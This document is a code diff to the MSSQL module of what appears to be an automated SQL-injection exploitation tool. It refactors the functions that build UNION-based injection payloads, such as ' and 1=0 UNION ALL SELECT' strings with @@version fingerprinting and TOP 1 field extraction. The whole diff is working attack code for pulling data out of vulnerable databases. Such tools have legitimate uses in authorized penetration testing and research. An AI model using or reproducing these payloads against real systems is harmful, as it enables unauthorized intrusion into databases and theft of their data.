@@ -22,7 +22,7 @@
 # Santiago Alessandri
 # Gastón Traberg
 
-from dbmsmoles import DbmsMole
+from dbmsmoles import DbmsMole, FingerBase
 
 class MssqlMole(DbmsMole):
     out_delimiter_result = "::-::"
@@ -103,31 +103,34 @@ class MssqlMole(DbmsMole):
             to_search = list(map(lambda x: '3rr_NO!', range(query_columns)))
             to_search[i] = str(base + i)
             hashes[i] = str(base + i)
-            output.append((list(hashes), to_search))
+            output.append(FingerBase(list(hashes), to_search))
             hashes[i] = DbmsMole.char_concat(str(base + i))
-            output.append((hashes, to_search))
+            output.append(FingerBase(hashes, to_search))
         hashes = []
         for i in range(base, base + query_columns):
             hashes.append(DbmsMole.char_concat(str(i)))
         to_search = list(map(str, range(base, base + query_columns)))
-        output.append((list(hashes), to_search))
+        output.append(FingerBase(list(hashes), to_search))
         hashes = []
         for i in range(base, base + query_columns):
             hashes.append(str(i))
-        output.append((list(hashes), to_search))
+        output.append(FingerBase(list(hashes), to_search))
         return output
 
     @classmethod
-    def field_finger_query(cls, columns, injectable_field):
+    def field_finger_query(cls, columns, finger, injectable_field):
         query = " and 1=0 UNION ALL SELECT "
-        query_list = list(map(lambda x: 'null', range(columns)))
-        query_list[injectable_field] = DbmsMole.char_concat(DbmsMole.field_finger_str)
+        query_list = list(finger._query)
+        query_list[injectable_field] = '@@version+' + DbmsMole.char_concat(DbmsMole.field_finger_str)
         query += ",".join(query_list)
         return query
 
+    def set_good_finger(self, finger):
+        self.query = finger
+
     def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = " and 1 = 0 UNION ALL SELECT TOP 1 "
-        query_list = list(map(lambda x: 'null', range(column_count)))
+        query_list = list(self.query)
         if fields == 'count(*)':
             query_list[injectable_field] = (MssqlMole.out_delimiter + '+cast(count(*) as varchar(50))+' + MssqlMole.out_delimiter)
             query += ','.join(query_list)
@@ -143,14 +146,6 @@ class MssqlMole(DbmsMole):
 
     def _concat_fields(self, fields):
         return ('+' + MssqlMole.inner_delimiter + '+').join(map(lambda x: 'isnull(cast(' + x + ' as varchar(100)), char(32))' ,fields))
-
-    @classmethod
-    def dbms_check_query(cls, columns, injectable_field):
-        query = " and 1 = 0 UNION ALL SELECT "
-        query_list = list(map(lambda x: 'null', range(columns)))
-        query_list[injectable_field] = "{fing}+@@version+{fing}".format(fing=MssqlMole.out_delimiter)
-        query += ",".join(query_list)
-        return query
 
     def parse_results(self, url_data):
         data_list = url_data.split(MssqlMole.out_delimiter_result)
